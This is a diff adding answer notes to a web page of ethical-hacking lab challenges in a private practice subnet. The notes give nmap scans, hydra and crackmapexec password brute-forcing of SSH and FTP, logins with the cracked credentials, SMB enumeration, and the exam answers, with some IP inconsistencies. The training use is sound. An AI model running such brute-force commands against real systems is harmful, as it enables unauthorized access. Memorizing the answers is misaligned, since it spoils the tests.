@@ -386,4 +386,67 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
     <p><ol>
         <ul>Go to EH Workstation - 2 file and locate the cowrie.log file in /home/attacker/Downloads folder</ul>
         <ul><a target=_blank href=https://adhdproject.github.io/#!Tools/Annoyance/Cowrie.md>open cowrie log file</a></ul>
+        <ul>cowrie.log can easily be opened with <b>pluma cowrie.log</b></ul>
+        <ul>answer: 172.30.10.99 is trying to access the target machine</ul>
+    </ol></p>
+<p>Challenge 4:</p>
+<p>Conduct a footprinting analysis on the target website www.certifiedhacker.com to determine the content length. (Format: NNN)</p>
+<p>answer:</p>
+<p><ol>
+    <ul>netcat www.certifiedhacker.com 80</ul>
+    <ul>answer: 347</ul>
+</ol></p>
+
+  <p>Challenge 5:</p>  
+    <p>You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in 
+        a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the 
+        folders present on the Desktop to find the target file) (Format: aNaa**NNNNNAA*)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>read this <a target=_blank href=https://digistam.github.io/cookbook/password_spraying.html>information</a></ul>
+            <ul>first we need to make a clean sheet and know the relevant hosts in the subnet:</ul>
+            <ul>nmap -p 22 192.168.10.0/24</ul>
+            <ul>the only hosts with an <b>open</b> port 22 are 192.168.1.101 and 192.168.1.111</ul>
+            <ul>hydra -l martin -P /home/attacker/Desktop/password.txt 192.168.10.101 ssh</ul>
+            <ul>crackmapexec ssh 192.168.10.101 -u martin -p /home/attacker/Desktop/password.txt</ul>
+            <ul>username martin found with password qwerty1234</ul>
+            <ul>ssh martin@192.168.1.101 </ul>
+            <ul>cd Desktop</ul>
+            <ul>type $ollers.txt</ul>
+            <ul>contents: <i>Password to enter my crypto account: i2tr&^72546HJ*</i></ul>     
+        </ol></p>
+
+    <p>Challenge 6:</p>
+    <p>Attackers have identified a vulnerable website and stored the details of this website on one of the machines within the 192.168.10.0/24 subnet. As a cybersecurity investigator you have been tasked to 
+        crack the FTP credentials of user nick and determine the ID of the domain. The information you need has been gathered and stored in the w_domain.txt file. (Format: NNNNNNNNNN)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul>nmap -p 21 192.168.10.0/24</ul>
+            <ul>Hosts with open port 21 are 192.168.10.101, 192.168.10.111, 192.168.10.144, 192.168.10.222</ul>
+            <ul>hydra -l nick -P /home/attacker/Desktop/password.txt 192.168.10.111</ul>
+            <ul>login: nick password: apple</ul>
+            <ul>ftp nick@192.168.10.111</ul>
+            <ul>cd Desktop</ul>
+            <ul>get w_domain.txt</ul>
+            <ul>exit</ul>
+            <ul>cat w_domain.txt</ul>
+            <ul>answer to the question is 7867721010</ul>
+        </ol></p>
+
+    <p>Challenge 7:</p>
+    <p>You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. 
+        (Format: Aa*aaNNNN)</p>
+        <p>Answer:</p>
+        <p><ol>
+            <ul></ul>
+        </ol></p>
+
+    <p>Challenge 8:</p>
+    <p>You are a penetration tester assigned to a new task. A list of websites is stored in the webpent.txt file on the target machine with the IP address 192.168.10.101. Your objective is to find the Meta-Author 
+        of the website that is highlighted in the list. (Hint: Use SMB service) (Format: AA-Aaaaaaa)</p>
+    <p>Answer:</p>
+    <p><ol>
+        <ul>nmap --script smb-enum-shares -p445 192.168.10.101</ul>
+        <ul>\\192.168.10.101\IPC$ has <b>Anonymous access: READ</b></ul>
+        <ul>We must do something with this information</ul>
     </ol></p>
